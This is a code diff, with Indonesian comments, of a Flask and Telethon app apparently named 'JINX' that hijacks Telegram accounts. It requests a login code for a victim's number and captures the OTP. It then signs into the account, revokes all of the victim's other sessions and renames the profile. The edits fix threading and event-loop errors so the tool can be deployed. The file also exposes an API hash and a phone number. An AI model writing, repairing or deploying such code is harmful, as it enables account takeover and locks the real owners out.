@@ -1,9 +1,12 @@
 from flask import Flask, request, jsonify
-from telethon.sync import TelegramClient
+from telethon import TelegramClient
 from telethon.sessions import StringSession
-from telethon import events
+import asyncio
+import nest_asyncio
 import os
 import json
+
+nest_asyncio.apply()  # FIX THREAD ERROR DI VERCEL
 
 app = Flask(__name__)
 
@@ -13,7 +16,7 @@ API_HASH = 'cd63113435f4997590ee4a308fbf1e2c'
 PHONE = '+6285697919996'
 SESSION_STRING = os.environ.get('SESSION_STRING')
 
-# Database sementara
+# Database
 DB_FILE = '/tmp/jinx_db.json'
 
 def save_target(phone, hash_code):
@@ -33,7 +36,6 @@ def update_otp(otp):
 
 # Client utama
 client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
-client.connect()
 
 # TANGKAP OTP
 @client.on(events.NewMessage(chats=PHONE))
@@ -51,37 +53,53 @@ async def auto_login(phone, phone_code_hash, otp):
         target_client = TelegramClient(StringSession(), API_ID, API_HASH)
         await target_client.connect()
         await target_client.sign_in(phone, code=otp, phone_code_hash=phone_code_hash)
-        print(f"[JINX] LOGIN SUKSES: {phone}")
+        print(f"[JINX] AUTO LOGIN SUKSES: {phone}")
         
         # HAPUS SESSION LAIN
-        sessions = await target_client(functions.account.GetAuthorizationsRequest())
-        for sess in sessions.authorizations:
-            if not sess.current:
-                await target_client(functions.account.ResetAuthorizationRequest(hash=sess.hash))
+        auths = await target_client(functions.account.GetAuthorizationsRequest())
+        for auth in auths.authorizations:
+            if not auth.current:
+                await target_client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
         
         await target_client(functions.account.UpdateProfileRequest(first_name="Akun Cadangan"))
         print(f"[JINX] AKUN {phone} AMAN!")
     except Exception as e:
         print(f"[JINX] GAGAL: {e}")
 
+# JALANKAN CLIENT DI BACKGROUND
+async def start_client():
+    await client.connect()
+    if not await client.is_user_authorized():
+        print("SESSION_STRING RUSAK! BUAT ULANG!")
+    await client.run_until_disconnected()
+
+# Background task
+import threading
+threading.Thread(target=lambda: asyncio.run(start_client()), daemon=True).start()
+
 @app.route('/send_code', methods=['POST'])
 def send_code():
     phone = request.form.get('phone')
     if not phone:
         return jsonify({'success': False, 'error': 'no phone'})
+    
+    # JALANIN DI LOOP BARU
+    async def run():
+        try:
+            res = await client.send_code_request(phone)
+            save_target(phone, res.phone_code_hash)
+            return {'success': True, 'hash': res.phone_code_hash}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+    
     try:
-        res = client.send_code_request(phone)
-        save_target(phone, res.phone_code_hash)
-        return jsonify({'success': True, 'hash': res.phone_code_hash})
+        return jsonify(asyncio.get_event_loop().run_until_complete(run()))
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/')
 def home():
-    return "JINX FULL AUTO JALAN! 😈"
-
-from threading import Thread
-Thread(target=client.run_until_disconnected).start()
+    return "JINX FULL AUTO — NO THREAD ERROR! 😈"
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
